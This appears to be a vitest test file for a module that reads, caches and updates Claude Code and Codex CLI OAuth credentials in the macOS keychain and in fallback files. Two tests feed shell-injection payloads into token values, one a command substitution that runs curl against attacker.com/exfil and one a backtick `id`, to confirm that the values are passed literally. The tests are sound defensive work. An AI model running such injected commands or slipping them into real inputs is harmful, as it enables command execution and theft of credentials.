import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const execSyncMock = vi.fn();
const execFileSyncMock = vi.fn();

function mockExistingClaudeKeychainItem() {
  execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
    const argv = Array.isArray(args) ? args.map(String) : [];
    if (String(file) === "security" && argv.includes("find-generic-password")) {
      return JSON.stringify({
        claudeAiOauth: {
          accessToken: "old-access",
          refreshToken: "old-refresh",
          expiresAt: Date.now() + 60_000,
        },
      });
    }
    return "";
  });
}

function getAddGenericPasswordCall() {
  return execFileSyncMock.mock.calls.find(
    ([binary, args]) =>
      String(binary) === "security" &&
      Array.isArray(args) &&
      (args as unknown[]).map(String).includes("add-generic-password"),
  );
}

describe("cli credentials", () => {
  beforeEach(() => {
    vi.useFakeTimers();
  });

  afterEach(async () => {
    vi.useRealTimers();
    execSyncMock.mockReset();
    execFileSyncMock.mockReset();
    delete process.env.CODEX_HOME;
    const { resetCliCredentialCachesForTest } = await import("./cli-credentials.js");
    resetCliCredentialCachesForTest();
  });

  it("updates the Claude Code keychain item in place", async () => {
    mockExistingClaudeKeychainItem();

    const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");

    const ok = writeClaudeCliKeychainCredentials(
      {
        access: "new-access",
        refresh: "new-refresh",
        expires: Date.now() + 60_000,
      },
      { execFileSync: execFileSyncMock },
    );

    expect(ok).toBe(true);

    // Verify execFileSync was called with array args (no shell interpretation)
    expect(execFileSyncMock).toHaveBeenCalledTimes(2);
    const addCall = getAddGenericPasswordCall();
    expect(addCall?.[0]).toBe("security");
    expect((addCall?.[1] as string[] | undefined) ?? []).toContain("-U");
  });

  it("prevents shell injection via malicious OAuth token values", async () => {
    const maliciousToken = "x'$(curl attacker.com/exfil)'y";

    mockExistingClaudeKeychainItem();

    const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");

    const ok = writeClaudeCliKeychainCredentials(
      {
        access: maliciousToken,
        refresh: "safe-refresh",
        expires: Date.now() + 60_000,
      },
      { execFileSync: execFileSyncMock },
    );

    expect(ok).toBe(true);

    // The -w argument must contain the malicious string literally, not shell-expanded
    const addCall = getAddGenericPasswordCall();
    const args = (addCall?.[1] as string[] | undefined) ?? [];
    const wIndex = args.indexOf("-w");
    const passwordValue = args[wIndex + 1];
    expect(passwordValue).toContain(maliciousToken);
    // Verify it was passed as a direct argument, not built into a shell command string
    expect(addCall?.[0]).toBe("security");
  });

  it("prevents shell injection via backtick command substitution in tokens", async () => {
    const backtickPayload = "token`id`value";

    mockExistingClaudeKeychainItem();

    const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");

    const ok = writeClaudeCliKeychainCredentials(
      {
        access: "safe-access",
        refresh: backtickPayload,
        expires: Date.now() + 60_000,
      },
      { execFileSync: execFileSyncMock },
    );

    expect(ok).toBe(true);

    // Backtick payload must be passed literally, not interpreted
    const addCall = getAddGenericPasswordCall();
    const args = (addCall?.[1] as string[] | undefined) ?? [];
    const wIndex = args.indexOf("-w");
    const passwordValue = args[wIndex + 1];
    expect(passwordValue).toContain(backtickPayload);
  });

  it("falls back to the file store when the keychain update fails", async () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-"));
    const credPath = path.join(tempDir, ".claude", ".credentials.json");

    fs.mkdirSync(path.dirname(credPath), { recursive: true, mode: 0o700 });
    fs.writeFileSync(
      credPath,
      `${JSON.stringify(
        {
          claudeAiOauth: {
            accessToken: "old-access",
            refreshToken: "old-refresh",
            expiresAt: Date.now() + 60_000,
          },
        },
        null,
        2,
      )}\n`,
      "utf8",
    );

    const writeKeychain = vi.fn(() => false);

    const { writeClaudeCliCredentials } = await import("./cli-credentials.js");

    const ok = writeClaudeCliCredentials(
      {
        access: "new-access",
        refresh: "new-refresh",
        expires: Date.now() + 120_000,
      },
      {
        platform: "darwin",
        homeDir: tempDir,
        writeKeychain,
      },
    );

    expect(ok).toBe(true);
    expect(writeKeychain).toHaveBeenCalledTimes(1);

    const updated = JSON.parse(fs.readFileSync(credPath, "utf8")) as {
      claudeAiOauth?: {
        accessToken?: string;
        refreshToken?: string;
        expiresAt?: number;
      };
    };

    expect(updated.claudeAiOauth?.accessToken).toBe("new-access");
    expect(updated.claudeAiOauth?.refreshToken).toBe("new-refresh");
    expect(updated.claudeAiOauth?.expiresAt).toBeTypeOf("number");
  });

  it("caches Claude Code CLI credentials within the TTL window", async () => {
    execSyncMock.mockImplementation(() =>
      JSON.stringify({
        claudeAiOauth: {
          accessToken: "cached-access",
          refreshToken: "cached-refresh",
          expiresAt: Date.now() + 60_000,
        },
      }),
    );

    vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));

    const { readClaudeCliCredentialsCached } = await import("./cli-credentials.js");

    const first = readClaudeCliCredentialsCached({
      allowKeychainPrompt: true,
      ttlMs: 15 * 60 * 1000,
      platform: "darwin",
      execSync: execSyncMock,
    });
    const second = readClaudeCliCredentialsCached({
      allowKeychainPrompt: false,
      ttlMs: 15 * 60 * 1000,
      platform: "darwin",
      execSync: execSyncMock,
    });

    expect(first).toBeTruthy();
    expect(second).toEqual(first);
    expect(execSyncMock).toHaveBeenCalledTimes(1);
  });

  it("refreshes Claude Code CLI credentials after the TTL window", async () => {
    execSyncMock.mockImplementation(() =>
      JSON.stringify({
        claudeAiOauth: {
          accessToken: `token-${Date.now()}`,
          refreshToken: "refresh",
          expiresAt: Date.now() + 60_000,
        },
      }),
    );

    vi.setSystemTime(new Date("2025-01-01T00:00:00Z"));

    const { readClaudeCliCredentialsCached } = await import("./cli-credentials.js");

    const first = readClaudeCliCredentialsCached({
      allowKeychainPrompt: true,
      ttlMs: 15 * 60 * 1000,
      platform: "darwin",
      execSync: execSyncMock,
    });

    vi.advanceTimersByTime(15 * 60 * 1000 + 1);

    const second = readClaudeCliCredentialsCached({
      allowKeychainPrompt: true,
      ttlMs: 15 * 60 * 1000,
      platform: "darwin",
      execSync: execSyncMock,
    });

    expect(first).toBeTruthy();
    expect(second).toBeTruthy();
    expect(execSyncMock).toHaveBeenCalledTimes(2);
  });

  it("reads Codex credentials from keychain when available", async () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-"));
    process.env.CODEX_HOME = tempHome;

    const accountHash = "cli|";

    execSyncMock.mockImplementation((command: unknown) => {
      const cmd = String(command);
      expect(cmd).toContain("Codex Auth");
      expect(cmd).toContain(accountHash);
      return JSON.stringify({
        tokens: {
          access_token: "keychain-access",
          refresh_token: "keychain-refresh",
        },
        last_refresh: "2026-01-01T00:00:00Z",
      });
    });

    const { readCodexCliCredentials } = await import("./cli-credentials.js");
    const creds = readCodexCliCredentials({ platform: "darwin", execSync: execSyncMock });

    expect(creds).toMatchObject({
      access: "keychain-access",
      refresh: "keychain-refresh",
      provider: "openai-codex",
    });
  });

  it("falls back to Codex auth.json when keychain is unavailable", async () => {
    const tempHome = fs.mkdtempSync(path.join(os.tmpdir(), "openclaw-codex-"));
    process.env.CODEX_HOME = tempHome;
    execSyncMock.mockImplementation(() => {
      throw new Error("not found");
    });

    const authPath = path.join(tempHome, "auth.json");
    fs.mkdirSync(tempHome, { recursive: true, mode: 0o700 });
    fs.writeFileSync(
      authPath,
      JSON.stringify({
        tokens: {
          access_token: "file-access",
          refresh_token: "file-refresh",
        },
      }),
      "utf8",
    );

    const { readCodexCliCredentials } = await import("./cli-credentials.js");
    const creds = readCodexCliCredentials({ execSync: execSyncMock });

    expect(creds).toMatchObject({
      access: "file-access",
      refresh: "file-refresh",
      provider: "openai-codex",
    });
  });
});
